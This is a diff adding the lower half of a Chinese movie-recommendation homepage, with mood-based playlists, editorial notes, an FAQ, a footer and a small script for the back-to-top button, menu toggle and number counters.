+            <li><span class="rank-no">4</span><span class="rank-txt"><b>千与千寻</b><span>日本 / 长大前必看一次</span></span><span class="rank-val">★ 9.4</span></li>
+            <li><span class="rank-no">5</span><span class="rank-txt"><b>一一</b><span>中国台湾 / 一个家庭的十年</span></span><span class="rank-val">★ 9.0</span></li>
+          </ul>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <section id="themes" style="background:rgba(255,255,255,.55);border-top:1px solid var(--line);border-bottom:1px solid var(--line)">
+    <div class="wrap">
+      <div class="sec-head">
+        <span class="num">MOOD LIST</span>
+        <div>
+          <h2>六个心情，六份片单</h2>
+          <p>不想看简介？直接选你现在的状态，我们给你三部刚好对味的片子。</p>
+        </div>
+        <a href="#works" class="link-more">全部片单 →</a>
+      </div>
+      <div class="themes">
+        <a class="theme light" href="#works" style="--c:linear-gradient(140deg,#3f8fc0,#12486f)">
+          <h3>阴雨天，想被治愈</h3>
+          <p>不需要多复杂的剧情，只要有人好好说话，有光透进窗户。</p>
+          <span class="num">01</span><span class="go">12 部</span>
+        </a>
+        <a class="theme" href="#works" style="--c:linear-gradient(140deg,#fff,#e7dcc4)">
+          <h3>周末，想出门走走</h3>
+          <p>公路片与旅行纪录，看完就想去订一张车票。</p>
+          <span class="num">02</span><span class="go">9 部</span>
+        </a>
+        <a class="theme light" href="#works" style="--c:linear-gradient(140deg,#e08a8a,#a84a4a)">
+          <h3>深夜，睡不着</h3>
+          <p>悬疑、文艺、老电影，配一杯热牛奶刚刚好。</p>
+          <span class="num">03</span><span class="go">15 部</span>
+        </a>
+        <a class="theme" href="#works" style="--c:linear-gradient(140deg,#fff,#d6e8d8)">
+          <h3>和孩子，一起看</h3>
+          <p>动画与冒险，大人也能看得津津有味。</p>
+          <span class="num">04</span><span class="go">11 部</span>
+        </a>
+        <a class="theme light" href="#works" style="--c:linear-gradient(140deg,#c9b6e0,#7a6ca8)">
+          <h3>想哭一场，痛快点</h3>
+          <p>有些眼泪需要被好好流一次，我们替你选好了纸巾。</p>
+          <span class="num">05</span><span class="go">8 部</span>
+        </a>
+        <a class="theme" href="#works" style="--c:linear-gradient(140deg,#fff,#e8d5c0)">
+          <h3>想笑一笑，轻松点</h3>
+          <p>生活喜剧与温情故事，笑完还能记住一两句台词。</p>
+          <span class="num">06</span><span class="go">13 部</span>
+        </a>
+      </div>
+    </div>
+  </section>
+
+  <section id="news">
+    <div class="wrap">
+      <div class="sec-head">
+        <span class="num">NOTE BOOK</span>
+        <div>
+          <h2>云端观影札记</h2>
+          <p>编辑部每周写点观后感、冷知识与排片提示，不讲剧透，只讲感受。</p>
+        </div>
+        <a href="#about" class="link-more">投稿给我们 →</a>
+      </div>
+      <div class="news-grid">
+        <article class="news-headline">
+          <div class="ph" aria-hidden="true"></div>
+          <div class="bd">
+            <span class="date">2026年10月20日 · 第 46 期</span>
+            <h3>为什么我们坚持"按心情"推荐电影</h3>
+            <p>榜单解决的是"什么最好"，而心情解决的是"什么刚好"。一篇关于选片逻辑的随笔，以及我们收集到的 200 多条读者反馈。</p>
+          </div>
+        </article>
+        <ul class="news-list">
+          <li><time>10.18</time><b>秋日治愈片单：八部适合穿毛衣看的电影</b></li>
+          <li><time>10.15</time><b>雨天观影实验：连续七天只看好心情电影</b></li>
+          <li><time>10.12</time><b>那些年被低估的国产文艺片，值得再看一次</b></li>
+          <li><time>10.09</time><b>孩子问我"为什么电影是彩色的"，我这样回答</b></li>
+          <li><time>10.05</time><b>深夜片单更新：适合一个人安静看完的七部</b></li>
+          <li><time>10.01</time><b>国庆不出门？六份主题片单帮你宅出仪式感</b></li>
+        </ul>
+      </div>
+    </div>
+  </section>
+
+  <section id="faq" style="background:rgba(255,255,255,.55);border-top:1px solid var(--line)">
+    <div class="wrap">
+      <div class="sec-head">
+        <span class="num">FAQ</span>
+        <div><h2>常有人问的几件事</h2></div>
+      </div>
+      <div class="faq-list">
+        <details class="faq" open>
+          <summary class="faq-q">白云影视是做什么的？<i aria-hidden="true">+</i></summary>
+          <div class="faq-a">这是一个按心情与天气帮你挑电影的地方。我们不提供播放服务，只整理片单、写观影理由、做相似推荐，把"今晚看什么"这件小事帮你做完。</div>
+        </details>
+        <details class="faq">
+          <summary class="faq-q">片单多久更新一次？<i aria-hidden="true">+</i></summary>
+          <div class="faq-a">每周一更新热度榜单，每周四更新一份主题片单，遇到节假日会额外加推。天气模块与公开气象数据同步，每天更新四次。</div>
+        </details>
+        <details class="faq">
+          <summary class="faq-q">推荐的依据是什么？<i aria-hidden="true">+</i></summary>
+          <div class="faq-a">主要看三条：读者真实的点击与停留时长、编辑部的反复观看记录、以及不同天气与时段下的观影反馈。评分只作参考，适合才是第一位。</div>
+        </details>
+        <details class="faq">
+          <summary class="faq-q">可以投稿或推荐片子吗？<i aria-hidden="true">+</i></summary>
+          <div class="faq-a">当然可以。在"关于"页面留下片名和你的一句话理由，被收录进片单的读者会收到一份小礼物。</div>
+        </details>
+        <details class="faq">
+          <summary class="faq-q">网站会收费吗？<i aria-hidden="true">+</i></summary>
+          <div class="faq-a">全部内容免费，没有会员、没有广告弹窗。网站托管在 GitHub Pages，访问地址为 baiyunyingshi-top.github.io。</div>
+        </details>
+      </div>
+    </div>
+  </section>
+
+  <section id="about">
+    <div class="wrap">
+      <div class="about">
+        <div class="about-grid">
+          <div>
+            <span class="num" style="border-color:rgba(255,255,255,.4);color:#fff">ABOUT</span>
+            <h2 style="margin-top:12px">关于白云影视</h2>
+            <p>白云影视从一个很小的念头开始：与其在成百上千的片名里挑花眼，不如先问自己一句"我现在是什么心情"。我们相信好电影不是用来"刷完"的，而是用来陪你度过某一段时光的。这里没有排行榜的焦虑，只有一份份等你打开的片单。</p>
+          </div>
+          <div class="about-stats">
+            <div class="about-stat"><b class="counter" data-t="2860">0</b><span>部精选影片</span></div>
+            <div class="about-stat"><b class="counter" data-t="38">0</b><span>个心情标签</span></div>
+            <div class="about-stat"><b class="counter" data-t="412">0</b><span>篇观影札记</span></div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+</main>
+
+<footer>
+  <div class="wrap">
+    <div class="foot-grid">
+      <div class="foot-brand">
+        <b>☁️ 白云影视</b>
+        <p>一个按心情与天气推荐电影和剧集的观影导航站。每部片子都附一句真实的观影理由，帮你少纠结十分钟。</p>
+      </div>
+      <div class="foot-col">
+        <h4>浏览</h4>
+        <a href="#cities">按城市找片单</a>
+        <a href="#works">正在热推</a>
+        <a href="#rank">热度榜单</a>
+        <a href="#themes">主题片单</a>
+      </div>
+      <div class="foot-col">
+        <h4>心情选片</h4>
+        <a href="#themes">治愈系</a>
+        <a href="#themes">公路片</a>
+        <a href="#themes">深夜场</a>
+        <a href="#themes">亲子共看</a>
+      </div>
+      <div class="foot-col">
+        <h4>关于</h4>
+        <a href="#news">观影札记</a>
+        <a href="#faq">常见问题</a>
+        <a href="#about">关于本站</a>
+        <a href="#top">回到顶部</a>
+      </div>
+    </div>
+    <div class="foot-bot">
+      <span>© 2026 白云影视 · 云端观影导航，用心陪你挑一部好片子</span>
+      <span>访问地址：<code>baiyunyingshi-top.github.io</code></span>
+    </div>
+  </div>
+</footer>
+
+<button class="top-btn" id="topBtn" aria-label="回到顶部">↑</button>
+
+<script>
+(function(){
+  var btn=document.getElementById('topBtn');
+  window.addEventListener('scroll',function(){
+    btn.style.display=window.scrollY>420?'grid':'none';
+  },{passive:true});
+  btn.addEventListener('click',function(){window.scrollTo({top:0,behavior:'smooth'});});
+
+  var mb=document.getElementById('menuBtn'),nl=document.getElementById('navLinks');
+  if(mb&&nl){mb.addEventListener('click',function(){nl.classList.toggle('open');});
+    nl.querySelectorAll('a').forEach(function(a){a.addEventListener('click',function(){nl.classList.remove('open');});});}
+
+  var d=document.getElementById('nowDate');
+  if(d){var t=new Date();d.textContent=t.getFullYear()+'.'+String(t.getMonth()+1).padStart(2,'0')+'.'+String(t.getDate()).padStart(2,'0');}
+
+  var counters=document.querySelectorAll('.counter');
+  function run(el){var t=+el.getAttribute('data-t'),n=0,step=Math.max(1,Math.ceil(t/60));
+    var id=setInterval(function(){n+=step;if(n>=t){n=t;clearInterval(id);}el.textContent=n.toLocaleString('zh-CN');},24);}
+  if('IntersectionObserver' in window){
+    var io=new IntersectionObserver(function(es){
+      es.forEach(function(e){if(e.isIntersecting){run(e.target);io.unobserve(e.target);}});
+    },{threshold:.3});
+    counters.forEach(function(c){io.observe(c);});
+  }else{counters.forEach(run);}
+})();
+</script>
+</body>
+</html>
